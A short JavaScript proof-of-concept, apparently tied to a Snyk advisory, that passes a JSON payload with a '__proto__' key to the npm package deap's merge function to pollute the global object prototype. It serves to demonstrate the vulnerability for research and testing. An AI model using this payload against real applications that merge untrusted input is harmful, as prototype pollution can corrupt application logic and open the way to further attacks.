//https://snyk.io/vuln/npm:deap:20180415
 
  const deap = require("deap");
  obj = {};
  let malicious_payload = '{"__proto__":{"polluted":"yes"}}';

   

  deap.merge({}, JSON.parse(malicious_payload));
// End of file
